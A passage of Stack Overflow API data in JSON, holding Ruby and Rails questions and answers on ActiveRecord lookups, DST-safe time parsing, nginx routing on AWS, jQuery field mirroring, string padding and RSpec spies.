"https://www.gravatar.com/avatar/3769375c18b7e5014e12dc714cc317c7?s=128&d=identicon&r=PG&f=1", "display_name": "dc115", "link": "https://stackoverflow.com/users/10600647/dc115"}, "edited": false, "score": 0, "creation_date": 1558553969, "post_id": 56263701, "comment_id": 99144107, "body": "Not that I&#39;m aware of. I think the tools that ruby and rails give you are for coding convenience rather than speed optimizations"}], "tags": [], "owner": {"reputation": 416, "user_id": 11529593, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-nMOHrxOg4nQ/AAAAAAAAAAI/AAAAAAAAAAA/ACHi3rfeI-u5UbYJIejKaTCqDSluZAyBDw/mo/photo.jpg?sz=128", "display_name": "Wombologist", "link": "https://stackoverflow.com/users/11529593/wombologist"}, "is_accepted": true, "score": 4, "last_activity_date": 1558553330, "creation_date": 1558553330, "answer_id": 56263701, "question_id": 56263412, "link": "https://stackoverflow.com/questions/56263412/how-to-check-existence-of-an-activerecord-from-a-query-without-iterating/56263701#56263701", "title": "How to check existence of an ActiveRecord from a query without iterating?", "body": "<p>From an algorithms perspective, you can't search an unsorted list faster than O(n). So iterating through your collection is the best way to search your collection.</p>\n"}], "owner": {"reputation": 97, "user_id": 10600647, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3769375c18b7e5014e12dc714cc317c7?s=128&d=identicon&r=PG&f=1", "display_name": "dc115", "link": "https://stackoverflow.com/users/10600647/dc115"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 175, "favorite_count": 0, "accepted_answer_id": 56263701, "answer_count": 3, "score": -1, "last_activity_date": 1558553330, "creation_date": 1558551976, "last_edit_date": 1558552387, "question_id": 56263412, "link": "https://stackoverflow.com/questions/56263412/how-to-check-existence-of-an-activerecord-from-a-query-without-iterating", "title": "How to check existence of an ActiveRecord from a query without iterating?", "body": "<p>I have a model <code>Item</code> with attributes <code>attr1</code>, <code>attr2</code> and <code>attr3</code>. </p>\n\n<p>Given a collection of <code>Item</code> models (e.g. from <code>Item.all</code>), how would I check if there exists an item with <code>attr1 == value1</code>, <code>attr2 == value2</code> and <code>attr3 == value3</code> <strong>without</strong> having to iterate through all the items or performing another query?</p>\n"}, {"tags": ["ruby", "time", "utc", "dst", "datetime-parsing"], "owner": {"reputation": 954, "user_id": 3259651, "user_type": "registered", "accept_rate": 56, "profile_image": "https://i.stack.imgur.com/xrrkE.jpg?s=128&g=1", "display_name": "Rojj", "link": "https://stackoverflow.com/users/3259651/rojj"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 67, "favorite_count": 0, "answer_count": 0, "score": 2, "last_activity_date": 1558554911, "creation_date": 1558551172, "last_edit_date": 1558554911, "question_id": 56263239, "link": "https://stackoverflow.com/questions/56263239/how-to-ignore-dst-when-parsing-string-to-time-time-parse-in-ruby", "title": "How to ignore DST when parsing string to time (Time.parse) in Ruby", "body": "<p>I need to parse strings with timestamps and convert them to <code>Time</code> objects.</p>\n\n<p>I am struggling to understand how <code>Time.parse</code> works and how to ignore DST and use always <code>UTC</code> or simply convert to <code>UTC</code></p>\n\n<p>I keep having duplicate hours when time transition from <code>GMT</code> to <code>DST</code>. I have tried:</p>\n\n<ul>\n<li><code>Time.parse(t)</code></li>\n<li><code>Time.parse(t).utc</code></li>\n<li><code>Time.strptime(t, \"%Y-%m-%d %H:%M:%S\")</code></li>\n</ul>\n\n<p>and all give the same result.This is an extract of my code</p>\n\n<pre><code>require 'time'\nts = [\"2010-03-28 00:00:00\", \"2010-03-28 01:00:00\", \"2010-03-28 02:00:00\", \"2010-03-28 03:00:00\"]\n\nts.each do |t|\n  puts \"t: #{t} -- pt: #{Time.parse(t)} -- dst: #{Time.parse(t).dst?} -- utc: #{Time.parse(t).utc} -- strptime: #{Time.strptime(t, \"%Y-%m-%d %H:%M:%S\")}\"\nend\n</code></pre>\n\n<p>The output is:</p>\n\n<pre><code>t: 2010-03-28 00:00:00 -- pt: 2010-03-28 00:00:00 +0000 -- dst: false -- utc: 2010-03-28 00:00:00 UTC -- strptime: 2010-03-28 00:00:00 +0000\nt: 2010-03-28 01:00:00 -- pt: 2010-03-28 02:00:00 +0100 -- dst: true -- utc: 2010-03-28 01:00:00 UTC -- strptime: 2010-03-28 02:00:00 +0100\nt: 2010-03-28 02:00:00 -- pt: 2010-03-28 02:00:00 +0100 -- dst: true -- utc: 2010-03-28 01:00:00 UTC -- strptime: 2010-03-28 02:00:00 +0100\nt: 2010-03-28 03:00:00 -- pt: 2010-03-28 03:00:00 +0100 -- dst: true -- utc: 2010-03-28 02:00:00 UTC -- strptime: 2010-03-28 03:00:00 +0100\n</code></pre>\n\n<p>Location: UK (if <code>locale</code> is important)</p>\n\n<p>Time: <code>DST</code></p>\n\n<p><code>Ruby 2.0.0-p247</code> on <code>macos</code> (I cannot change it)</p>\n\n<p><strong>EDIT</strong></p>\n\n<p>Not sure this is a hack, but adding <code>\" UTC\"</code> to the time string solves the problem. See updated code:</p>\n\n<pre><code>require 'time'\nts.map{|t| t + \" UTC\"}.each do |t|\n  puts \"t: #{t} -- pt: #{Time.parse(t)} -- dst: #{Time.parse(t).dst?} -- utc: #{Time.parse(t).utc} -- \\\n  strptime: #{Time.strptime(t, \"%Y-%m-%d %H:%M:%S\")}\"\nend\n</code></pre>\n\n<p>The output is now:</p>\n\n<pre><code>t: 2010-03-28 00:00:00 UTC -- pt: 2010-03-28 00:00:00 UTC -- dst: false -- utc: 2010-03-28 00:00:00 UTC --   strptime: 2010-03-28 00:00:00 +0000\nt: 2010-03-28 01:00:00 UTC -- pt: 2010-03-28 01:00:00 UTC -- dst: false -- utc: 2010-03-28 01:00:00 UTC --   strptime: 2010-03-28 02:00:00 +0100\nt: 2010-03-28 02:00:00 UTC -- pt: 2010-03-28 02:00:00 UTC -- dst: false -- utc: 2010-03-28 02:00:00 UTC --   strptime: 2010-03-28 02:00:00 +0100\nt: 2010-03-28 03:00:00 UTC -- pt: 2010-03-28 03:00:00 UTC -- dst: false -- utc: 2010-03-28 03:00:00 UTC --   strptime: 2010-03-28 03:00:00 +0100\n</code></pre>\n\n<p>Of course the last parsing with <code>strptime</code> is wrong as it is ignoring <code>UTC</code>.</p>\n"}, {"tags": ["ruby", "nginx", "thin"], "comments": [{"owner": {"reputation": 8733, "user_id": 3625433, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/N7qK6.png?s=128&g=1", "display_name": "lacostenycoder", "link": "https://stackoverflow.com/users/3625433/lacostenycoder"}, "edited": false, "score": 1, "creation_date": 1558550382, "post_id": 56262371, "comment_id": 99142518, "body": "can you post the backtrace errors when you try to hit the routes without the api namespace?"}, {"owner": {"reputation": 62, "user_id": 10230313, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-DBkN5WijgG0/AAAAAAAAAAI/AAAAAAAAAAA/AAnnY7rldRz97etd0y_Xa3rlXjJkOoQaow/mo/photo.jpg?sz=128", "display_name": "mylan atlani", "link": "https://stackoverflow.com/users/10230313/mylan-atlani"}, "reply_to_user": {"reputation": 8733, "user_id": 3625433, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/N7qK6.png?s=128&g=1", "display_name": "lacostenycoder", "link": "https://stackoverflow.com/users/3625433/lacostenycoder"}, "edited": false, "score": 0, "creation_date": 1558560303, "post_id": 56262371, "comment_id": 99146770, "body": "i updated my post"}], "owner": {"reputation": 62, "user_id": 10230313, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-DBkN5WijgG0/AAAAAAAAAAI/AAAAAAAAAAA/AAnnY7rldRz97etd0y_Xa3rlXjJkOoQaow/mo/photo.jpg?sz=128", "display_name": "mylan atlani", "link": "https://stackoverflow.com/users/10230313/mylan-atlani"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 50, "favorite_count": 0, "answer_count": 0, "score": 2, "last_activity_date": 1558610222, "creation_date": 1558547346, "last_edit_date": 1558610222, "question_id": 56262371, "link": "https://stackoverflow.com/questions/56262371/how-to-resolve-aws-problem-route-not-found-nginx-ruby", "title": "How to resolve AWS problem route not found Nginx Ruby?", "body": "<p>I'm trying to install my Ruby API on an AWS server, with nginx. \nAnd I have a problem that nginx can't find some of my roads (which works very well locally).</p>\n\n<p>But it finds the one that are present on the address_server/v1/test path, but not the one present on address_server/test.</p>\n\n<p>Does anyone have any idea where this might come from?</p>\n\n<p>Thank you for taking some of your time!</p>\n\n<p>Route.rb</p>\n\n<pre><code>Rails.application.routes.draw do\n  devise_for :admin_users, ActiveAdmin::Devise.config\n  ActiveAdmin.routes(self)\n\n  post 'user_token' =&gt; 'user_token#create'\n  post 'user_fb_token' =&gt; 'user_fb_token#fb_create'\n\n  namespace :api_v1, path: :v1, defaults: { format: :json } do\n    DEFAULT_API_V1_OPTS = {only: [:index, :show, :create, :update, :destroy], defaults: { format: :json }}.freeze\n\n    post 'dislike', to: 'likes#delete', defaults: { format: :json }\n    resources :likes, only: [:index, :show, :create, :update]\n\n    post 'unwish', to: 'wishes#delete', defaults: { format: :json }\n    resources :wishes, DEFAULT_API_V1_OPTS\n\n    resources :notes, DEFAULT_API_V1_OPTS\n\n    get 'products/wished', to: 'products#wished', defaults: { format: :json }\n    resources :products, DEFAULT_API_V1_OPTS\n\n    resources :categories, DEFAULT_API_V1_OPTS\n    resources :happies, DEFAULT_API_V1_OPTS\n    get 'selfies/liked', to: 'selfies#liked', defaults: { format: :json }\n    get 'selfies/me', to: 'selfies#show_me', defaults: { format: :json }\n    resources :selfies, DEFAULT_API_V1_OPTS\n    get 'selfies/:id/fb_share', to: 'selfies#fb_share', defaults: { format: :json }\n\n    get 'users/notify', to: 'users#notify_me', defaults: {format: :json}\n    get 'users/me', to: 'users#show_me', defaults: { format: :json } \n    put 'users/me', to: 'users#update_me', defaults: { format: :json } \n    resources :users, DEFAULT_API_V1_OPTS\n    get 'users/:id/request_friends', to: 'users#request_friends', defaults: { format: :json }\n    get 'users/request_friends_callback', to: 'users#request_friends_callback', defaults: { format: :json }\n    post 'users/:id/register_device', to: 'users#register_device', defaults: { format: :json }\n    resources :reports, DEFAULT_API_V1_OPTS\n  end\nend\n</code></pre>\n\n<p>nginx config :</p>\n\n<pre><code> upstream thin {\n   server 127.0.0.1:3000;\n }\n\nserver {\n  listen 80;\n server_name 52.47.133.83;\n\nroot /home/ubuntu/happer-api/public;\n\nlocation / {\n  proxy_set_header X-Real-IP $remote_addr;\n  proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;\n  proxy_set_header Host $http_host;\n  proxy_redirect off;\n\n  if (-f $request_filename/index.html) {\n    rewrite (.*) $1/index.html break;\n  }\n  if (-f $request_filename.html) {\n    rewrite (.*) $1.html break;\n  }\n  if (!-f $request_filename) {\n    proxy_pass http://thin;\n    break;\n  }\n}\n\nerror_page 500 502 503 504 /50x.html;\nlocation = /50x.html {\n  root html;\n}\n}\n</code></pre>\n\nUpdate\n\n<p>Backtrace from postman</p>\n\n<pre><code>Server \u2192nginx/1.14.0 (Ubuntu)\nDate \u2192Wed, 22 May 2019 21:21:43 GMT\nContent-Type \u2192text/html\nTransfer-Encoding \u2192chunked\nConnection \u2192keep-alive\nX-Frame-Options \u2192SAMEORIGIN\nX-XSS-Protection \u21921; mode=block\nX-Content-Type-Options \u2192nosniff\nCache-Control \u2192no-cache\nX-Request-Id \u2192a65170fb-21e9-4e21-932a-f1ef554c94c3\nX-Runtime \u21920.079642\nContent-Encoding \u2192gzip\n</code></pre>\n\n<p>nginx error log :</p>\n\n<pre><code>2019/05/23 10:48:29 [error] 15887#15887: *34 connect() failed (111: Connection refused) while connecting to upstream, client: 109.210.187.167, server: 52.47.133.83, request: \"POST /user_token HTTP/1.1\", upstream: \"http://127.0.0.1:3000/user_token\", host: \"52.47.133.83\"\n</code></pre>\n"}, {"tags": ["ruby-on-rails", "ruby", "forms", "textfield"], "comments": [{"owner": {"reputation": 172, "user_id": 1389297, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/67a01a118cb2582c77316ee026d36540?s=128&d=identicon&r=PG", "display_name": "Ali Akbar", "link": "https://stackoverflow.com/users/1389297/ali-akbar"}, "edited": false, "score": 1, "creation_date": 1558541294, "post_id": 56260741, "comment_id": 99138476, "body": "Create a javascript method and call it oninput of text field name."}, {"owner": {"reputation": 3705, "user_id": 8551976, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/oxgdN.jpg?s=128&g=1", "display_name": "asimhashmi", "link": "https://stackoverflow.com/users/8551976/asimhashmi"}, "edited": false, "score": 0, "creation_date": 1558541588, "post_id": 56260741, "comment_id": 99138643, "body": "in which file, the posted code resides?"}, {"owner": {"reputation": 5312, "user_id": 6535997, "user_type": "registered", "accept_rate": 62, "profile_image": "https://graph.facebook.com/10156345016155058/picture?type=large", "display_name": "Mark", "link": "https://stackoverflow.com/users/6535997/mark"}, "edited": false, "score": 0, "creation_date": 1558541647, "post_id": 56260741, "comment_id": 99138676, "body": "As AliAkbar says, if you want stuff to change before it hits the server (i.e. in real time) you&#39;ll need to use Javascript."}, {"owner": {"reputation": 13, "user_id": 9872153, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-XdUIqdMkCWA/AAAAAAAAAAI/AAAAAAAAAAA/4252rscbv5M/photo.jpg?sz=128", "display_name": "Fang Yuan", "link": "https://stackoverflow.com/users/9872153/fang-yuan"}, "edited": false, "score": 0, "creation_date": 1558544296, "post_id": 56260741, "comment_id": 99139927, "body": "Thank you. Ali and Mark, I am going to see how to do it with JavaScript."}], "answers": [{"comments": [{"owner": {"reputation": 13, "user_id": 9872153, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-XdUIqdMkCWA/AAAAAAAAAAI/AAAAAAAAAAA/4252rscbv5M/photo.jpg?sz=128", "display_name": "Fang Yuan", "link": "https://stackoverflow.com/users/9872153/fang-yuan"}, "edited": false, "score": 0, "creation_date": 1558713940, "post_id": 56262608, "comment_id": 99204661, "body": "Thank you for help. That is what I want."}], "tags": [], "owner": {"reputation": 1217, "user_id": 10430642, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/p5jzL.jpg?s=128&g=1", "display_name": "Dimitrius Lachi", "link": "https://stackoverflow.com/users/10430642/dimitrius-lachi"}, "is_accepted": true, "score": 1, "last_activity_date": 1558548376, "creation_date": 1558548376, "answer_id": 56262608, "question_id": 56260741, "link": "https://stackoverflow.com/questions/56260741/ruby-on-rails-make-text-field-displaying-the-content-from-another-text-field-wh/56262608#56262608", "title": "Ruby On Rails: make text_field displaying the content from another text_field while editing", "body": "<p>You can do it with a JS/Jquery little help, see:</p>\n\n<pre class=\"lang-js prettyprint-override\"><code>var $projectNameField = $('#project_name');\nvar $readOnlyField = $('#project_path');\n\n$projectNameField.on('change', function() {\n  var inputText = $projectNameField.val();\n  $readOnlyField.val(inputText);\n})\n</code></pre>\n\n<p>When some text was added to <code>project_name</code> it will be replied in <code>project_path</code></p>\n"}], "owner": {"reputation": 13, "user_id": 9872153, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-XdUIqdMkCWA/AAAAAAAAAAI/AAAAAAAAAAA/4252rscbv5M/photo.jpg?sz=128", "display_name": "Fang Yuan", "link": "https://stackoverflow.com/users/9872153/fang-yuan"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 46, "favorite_count": 0, "accepted_answer_id": 56262608, "answer_count": 1, "score": 1, "last_activity_date": 1558548376, "creation_date": 1558540413, "question_id": 56260741, "link": "https://stackoverflow.com/questions/56260741/ruby-on-rails-make-text-field-displaying-the-content-from-another-text-field-wh", "title": "Ruby On Rails: make text_field displaying the content from another text_field while editing", "body": "<p>I am fresh of ruby on rails and have a question about how to display a input on multiple text_fields.\nFor example, I have two textfields called name and path. While I type \"Project\" in name textfield, I want the the path textfield can display \"/path/Project\".\n<a href=\"https://i.stack.imgur.com/HlU4I.png\" rel=\"nofollow noreferrer\">enter image description here</a></p>\n\n<pre><code>  &lt;div class=\"field\"&gt;\n    &lt;%= form.label :name %&gt;\n    &lt;%= form.text_field :name, id: :project_name %&gt;\n  &lt;/div&gt;\n\n  &lt;div class=\"field\"&gt;\n    &lt;%= form.label :path %&gt;\n    &lt;%= form.text_field :path, id: :project_path, :readonly =&gt; true  %&gt;\n  &lt;/div&gt;\n</code></pre>\n\n<p>Any recommendation is appreciated.</p>\n"}, {"tags": ["regex", "ruby", "string"], "comments": [{"owner": {"reputation": 150540, "user_id": 128421, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/71770d043c0f7e3c7bc5f74190015c26?s=128&d=identicon&r=PG", "display_name": "the Tin Man", "link": "https://stackoverflow.com/users/128421/the-tin-man"}, "edited": false, "score": 1, "creation_date": 1558568945, "post_id": 56260464, "comment_id": 99148815, "body": "Regex are generally slower and result in less readable code and can easily hide logic errors that bite you at 3AM. Sure, they&#39;re cool but senior developers learn to use them carefully, usually because of those 3AM panic sessions."}, {"owner": {"reputation": 93653, "user_id": 256970, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/87b71ecb90417c88f7873a2f0f9492e9?s=128&d=identicon&r=PG", "display_name": "Cary Swoveland", "link": "https://stackoverflow.com/users/256970/cary-swoveland"}, "edited": false, "score": 0, "creation_date": 1571630052, "post_id": 56260464, "comment_id": 103291225, "body": "If any of the answers were helpful you should select the one you found most helpful."}], "answers": [{"comments": [{"owner": {"reputation": 12629, "user_id": 4739257, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/MdhEs.jpg?s=128&g=1", "display_name": "Ilya", "link": "https://stackoverflow.com/users/4739257/ilya"}, "edited": false, "score": 4, "creation_date": 1558543426, "post_id": 56260497, "comment_id": 99139523, "body": "btw, <code>ljust</code> receives placeholder as well, e.g. <code>&quot;apple&quot;.ljust(15, &#39;_&#39;)</code>"}], "tags": [], "owner": {"reputation": 209014, "user_id": 125816, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7f5aa40b1e7a95599c7a19451f88ff3a?s=128&d=identicon&r=PG", "display_name": "Sergio Tulentsev", "link": "https://stackoverflow.com/users/125816/sergio-tulentsev"}, "is_accepted": true, "score": 9, "last_activity_date": 1558539628, "creation_date": 1558539628, "answer_id": 56260497, "question_id": 56260464, "link": "https://stackoverflow.com/questions/56260464/how-to-add-spaces-to-any-given-string-and-maintain-n-chars/56260497#56260497", "title": "How to add spaces to any given string and maintain N chars?", "body": "<p>No need to involve regex</p>\n\n<pre><code>\"apple\".ljust(15) # =&gt; \"apple          \"\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 209014, "user_id": 125816, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7f5aa40b1e7a95599c7a19451f88ff3a?s=128&d=identicon&r=PG", "display_name": "Sergio Tulentsev", "link": "https://stackoverflow.com/users/125816/sergio-tulentsev"}, "edited": false, "score": 2, "creation_date": 1558540716, "post_id": 56260591, "comment_id": 99138122, "body": "Or <code>input[0...15]</code> instead of <code>input.chars.first(15).join</code>"}, {"owner": {"reputation": 381813, "user_id": 1863229, "user_type": "registered", "accept_rate": 58, "profile_image": "https://i.stack.imgur.com/4sh1l.png?s=128&g=1", "display_name": "Tim Biegeleisen", "link": "https://stackoverflow.com/users/1863229/tim-biegeleisen"}, "reply_to_user": {"reputation": 209014, "user_id": 125816, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7f5aa40b1e7a95599c7a19451f88ff3a?s=128&d=identicon&r=PG", "display_name": "Sergio Tulentsev", "link": "https://stackoverflow.com/users/125816/sergio-tulentsev"}, "edited": false, "score": 0, "creation_date": 1558540764, "post_id": 56260591, "comment_id": 99138161, "body": "@SergioTulentsev I&#39;m a newcomer to the wide world of Ruby.  Actually, I am short my daily quota for points, so I&#39;m trolling around everywhere now :P"}, {"owner": {"reputation": 150540, "user_id": 128421, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/71770d043c0f7e3c7bc5f74190015c26?s=128&d=identicon&r=PG", "display_name": "the Tin Man", "link": "https://stackoverflow.com/users/128421/the-tin-man"}, "edited": false, "score": 0, "creation_date": 1558570533, "post_id": 56260591, "comment_id": 99149119, "body": "You might want to drop the use of trailing semicolons as they&#39;re rarely necessary and often contribute to code that&#39;s hard to read, and we know what happens when unnecessary stuff joins with hard to read stuff...."}], "tags": [], "owner": {"reputation": 381813, "user_id": 1863229, "user_type": "registered", "accept_rate": 58, "profile_image": "https://i.stack.imgur.com/4sh1l.png?s=128&g=1", "display_name": "Tim Biegeleisen", "link": "https://stackoverflow.com/users/1863229/tim-biegeleisen"}, "is_accepted": false, "score": 2, "last_activity_date": 1558574608, "last_edit_date": 1558574608, "creation_date": 1558539910, "answer_id": 56260591, "question_id": 56260464, "link": "https://stackoverflow.com/questions/56260464/how-to-add-spaces-to-any-given-string-and-maintain-n-chars/56260591#56260591", "title": "How to add spaces to any given string and maintain N chars?", "body": "<p>Here is another way using a left padding trick:</p>\n\n<pre><code>padding = \"               \"\ninput = \"123\" + padding\nputs input.chars.first(15).join\n\n\"123            \"\n        ^^ 12 spaces\n</code></pre>\n\n<p>The idea here is to concatenate a string containing 15 spaces to the <em>right</em> of the input string.  Then, we retain the first 15 characters of that concatenated result.</p>\n"}, {"tags": [], "owner": {"reputation": 3201, "user_id": 2892779, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/uvM8S.jpg?s=128&g=1", "display_name": "Jay Dorsey", "link": "https://stackoverflow.com/users/2892779/jay-dorsey"}, "is_accepted": false, "score": 5, "last_activity_date": 1558569183, "last_edit_date": 1558569183, "creation_date": 1558541138, "answer_id": 56260962, "question_id": 56260464, "link": "https://stackoverflow.com/questions/56260464/how-to-add-spaces-to-any-given-string-and-maintain-n-chars/56260962#56260962", "title": "How to add spaces to any given string and maintain N chars?", "body": "<p>I think Sergio's answer is the best based on the complexity of the question, but you can also use string formatting (<code>sprintf</code>) if you need more complex formatting later:</p>\n\n<pre><code>\"%-15s\" % \"apple\" # =&gt; \"apple          \"\n</code></pre>\n\n<p>Read <a href=\"https://idiosyncratic-ruby.com/49-what-the-format.html\" rel=\"nofollow noreferrer\">documentation</a> for the patterns and how to read/write them.</p>\n"}], "owner": {"reputation": 43, "user_id": 5313962, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2141320bdf425a68e58160376b5e5e2e?s=128&d=identicon&r=PG&f=1", "display_name": "Donald C.", "link": "https://stackoverflow.com/users/5313962/donald-c"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 83, "favorite_count": 1, "accepted_answer_id": 56260497, "answer_count": 3, "score": 1, "last_activity_date": 1558574608, "creation_date": 1558539487, "last_edit_date": 1558539974, "question_id": 56260464, "link": "https://stackoverflow.com/questions/56260464/how-to-add-spaces-to-any-given-string-and-maintain-n-chars", "title": "How to add spaces to any given string and maintain N chars?", "body": "<p>In Ruby using regex, I want to modify a given string that will be shorter than or exactly 15 characters, so that it is always 15 characters by adding spaces.</p>\n\n<p>For example:</p>\n\n<pre><code>'apple' =&gt; 'apple(10 spaces here)'\n\n'orange' =&gt; 'orange(9 spaces here)'\n\n'fifteenspaceshi' =&gt; 'fifteenspaceshi'\n</code></pre>\n\n<p>I have tried this and it works but would regex have a more elegant solution?</p>\n\n<pre><code>x = 'apple'\n\nx = x + ' '*(15 - x.length)\n</code></pre>\n"}, {"tags": ["ruby-on-rails", "ruby", "rspec"], "comments": [{"owner": {"reputation": 22436, "user_id": 1954610, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/27d84db27dd0528916e8cd6954bdd328?s=128&d=identicon&r=PG", "display_name": "Tom Lord", "link": "https://stackoverflow.com/users/1954610/tom-lord"}, "edited": false, "score": 1, "creation_date": 1558544189, "post_id": 56260036, "comment_id": 99139881, "body": "Please provide a <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a>. Your code doesn&#39;t make sense. Is <code>MyModule</code> a class, or a module? Currently it&#39;s a class <i>and</i> a module, and it includes itself??! Where is the <code>bar</code> method defined? What does your test look like?"}, {"owner": {"reputation": 22436, "user_id": 1954610, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/27d84db27dd0528916e8cd6954bdd328?s=128&d=identicon&r=PG", "display_name": "Tom Lord", "link": "https://stackoverflow.com/users/1954610/tom-lord"}, "edited": false, "score": 1, "creation_date": 1558544296, "post_id": 56260036, "comment_id": 99139926, "body": "How have you tried to set up the spy currently? What result do you expect? What result do you get? If there&#39;s an error, what does it say?"}, {"owner": {"reputation": 3320, "user_id": 4950680, "user_type": "registered", "accept_rate": 58, "profile_image": "https://i.stack.imgur.com/C8cEh.jpg?s=128&g=1", "display_name": "Martin Zinovsky", "link": "https://stackoverflow.com/users/4950680/martin-zinovsky"}, "edited": false, "score": 0, "creation_date": 1558545049, "post_id": 56260036, "comment_id": 99140231, "body": "Is this what you are looking for? <a href=\"https://stackoverflow.com/questions/21262309/rspec-how-to-test-if-a-method-was-called\"><code>RSpec: how to test if a method was called?</code></a>"}, {"owner": {"reputation": 1578, "user_id": 6003161, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/4baeef3d0ff8d4dec06271c9b0125922?s=128&d=identicon&r=PG&f=1", "display_name": "Pants", "link": "https://stackoverflow.com/users/6003161/pants"}, "edited": false, "score": 0, "creation_date": 1558564009, "post_id": 56260036, "comment_id": 99147805, "body": "<code>MyModule</code> is a module with a method <code>bar</code>. <code>bar</code> gets called by <code>MyModel</code> which includes <code>MyModule</code>. Maybe you misread the names?  The issue as you may know is ActiveRecord models are defined and consequently call <code>bar</code> before Rspec even begins running."}, {"owner": {"reputation": 1578, "user_id": 6003161, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/4baeef3d0ff8d4dec06271c9b0125922?s=128&d=identicon&r=PG&f=1", "display_name": "Pants", "link": "https://stackoverflow.com/users/6003161/pants"}, "reply_to_user": {"reputation": 22436, "user_id": 1954610, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/27d84db27dd0528916e8cd6954bdd328?s=128&d=identicon&r=PG", "display_name": "Tom Lord", "link": "https://stackoverflow.com/users/1954610/tom-lord"}, "edited": false, "score": 0, "creation_date": 1558617558, "post_id": 56260036, "comment_id": 99166628, "body": "@TomLord I added more details"}], "answers": [{"tags": [], "owner": {"reputation": 56, "user_id": 9758610, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/e20hn.jpg?s=128&g=1", "display_name": "Foton", "link": "https://stackoverflow.com/users/9758610/foton"}, "is_accepted": false, "score": 2, "last_activity_date": 1558547410, "creation_date": 1558547410, "answer_id": 56262386, "question_id": 56260036, "link": "https://stackoverflow.com/questions/56260036/how-to-spy-on-a-method-called-at-class-level-on-activerecord-model/56262386#56262386", "title": "How to spy on a method called at class level on ActiveRecord model?", "body": "<p>If you call elsewhere MyModel.new.bar, you can write in the test</p>\n\n<pre><code>expect_any_instance_of(MyModel).to receive(:bar)\n</code></pre>\n\n<p>If you want to use 'spy', you can use:</p>\n\n<pre><code>allow_any_instance_of(MyModel).to receive(:bar)\n</code></pre>\n\n<p>If you have link to your MyModel instance inside the test, you can rewrite above examples such way:</p>\n\n<pre><code>expect(my_model_instance).to receive(:bar)\n</code></pre>\n\n<p>or</p>\n\n<pre><code>allow(my_model_instance).to receive(:bar)\n</code></pre>\n\n<p>You should understand that after including any module into you class, instance of that class will be receiver of the method.</p>\n"}], "owner": {"reputation": 1578, "user_id": 6003161, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/4baeef3d0ff8d4dec06271c9b0125922?s=128&d=identicon&r=PG&f=1", "display_name": "Pants", "link": "https://stackoverflow.com/users/6003161/pants"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 366, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1558617544, "creation_date": 1558538049, "last_edit_date": 1558617544, "question_id": 56260036, "link": "https://stackoverflow.com/questions/56260036/how-to-spy-on-a-method-called-at-class-level-on-activerecord-model", "title": "How to spy on a method called at class level on ActiveRecord model?", "body": "<p>If I have a model</p>\n\n<pre><code>module MyModule\n  def bar(str)\n    puts str\n  end\nend\n\nMyModel &lt; ActiveRecord::Base\n  include MyModule\n  bar('foo')\nend\n</code></pre>\n\n<p>My spec:</p>\n\n<pre><code>describe MyModel do\n  before do\n    described_class.stubs(:bar)\n  end\n\n  it 'calls bar with correct arguments' do\n    # This does not work because it is called before it gets stubbed\n    expect(described_class).to have_received(:bar).with('foo')\n  end\nend\n</code></pre>\n\n<p>How can I spy on <code>MyModule#bar</code> when called from <code>MyModel</code>?</p>\n\n<p>Using rspec-rails 2.99 and mocha 0.13.3</p>\n"}, {"tags": ["ruby", "csv"], "comments": [{"owner": {"reputation": 4348, "user_id": 3435610, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/IBOFX.jpg?s=128&g=1", "display_name": "Sara Tibbetts", "link": "https://stackoverflow.com/users/3435610/sara-tibbetts"}, "edited": false, "score": 0, "creation_date": 1558537906, "post_id": 56259806, "comment_id": 99136578, "body": "In your file is this across two lines? &quot;incremented by 1 each time a  message has been transmitted&quot;"}, {"owner": {"reputation": 658, "user_id": 467083, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/e32852b0ba8af2d90ca9de291e6a8150?s=128&d=identicon&r=PG", "display_name": 